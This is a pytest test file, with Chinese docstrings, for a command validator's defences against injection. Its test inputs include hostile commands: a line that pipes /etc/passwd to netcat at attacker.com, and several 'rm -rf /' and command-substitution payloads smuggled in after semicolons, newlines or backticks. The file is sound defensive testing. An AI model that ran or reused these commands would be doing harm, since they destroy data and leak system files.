"""InnovationManager 安全测试

测试命令注入防护措施
"""

import pytest

from backend.services.learning.innovation_manager import InnovationManager


class TestCommandValidation:
    """命令验证测试"""

    def setup_method(self):
        """每个测试前创建管理器实例"""
        self.manager = InnovationManager(project_root="/tmp/test")

    def test_validate_safe_command(self):
        """测试安全命令通过验证"""
        safe_commands = [
            "pytest tests/",
            "npm test",
            "python -m pytest",
            "make build",
            "cargo test",
        ]

        for cmd in safe_commands:
            args = self.manager._validate_command(cmd)
            assert isinstance(args, list)
            assert len(args) > 0

    def test_validate_command_with_semicolon(self):
        """shlex.split 将分号变为字面量参数，shell=False 下安全"""
        args = self.manager._validate_command("pytest tests/; rm -rf /")
        assert args[0] == "pytest"

    def test_validate_command_with_pipe(self):
        """测试拒绝包含管道的命令"""
        with pytest.raises(ValueError, match="非法字符|禁止的命令"):
            self.manager._validate_command("cat /etc/passwd | nc attacker.com 1234")

    def test_validate_command_with_ampersand(self):
        """测试拒绝包含&&的命令"""
        with pytest.raises(ValueError, match="非法字符"):
            self.manager._validate_command("pytest && malicious_command")

    def test_validate_command_with_backtick(self):
        """shlex.split 将反引号变为字面量，shell=False 下安全"""
        args = self.manager._validate_command("echo `whoami`")
        assert args[0] == "echo"

    def test_validate_command_with_dollar_sign(self):
        """shlex.split 将$变量变为字面量，shell=False 下安全"""
        args = self.manager._validate_command("echo $HOME")
        assert args[0] == "echo"

    def test_validate_command_with_parentheses(self):
        """测试拒绝包含括号的命令"""
        with pytest.raises(ValueError, match="不允许的命令|禁止的命令"):
            self.manager._validate_command("$(malicious_command)")

    def test_validate_command_with_redirects(self):
        """测试拒绝包含重定向的命令"""
        with pytest.raises(ValueError, match="非法字符"):
            self.manager._validate_command("cat file > /tmp/output")

    def test_validate_command_with_newline(self):
        """shlex.split 处理换行，shell=False 下多参数安全"""
        args = self.manager._validate_command("pytest tests/\nrm -rf /")
        assert args[0] == "pytest"

    def test_validate_empty_command(self):
        """测试空命令"""
        with pytest.raises(ValueError, match="不能为空"):
            self.manager._validate_command("")

    def test_validate_command_with_spaces(self):
        """测试包含空格的正常命令"""
        # 正常的命令参数应该通过
        self.manager._validate_command("pytest tests/ -v --tb=short")
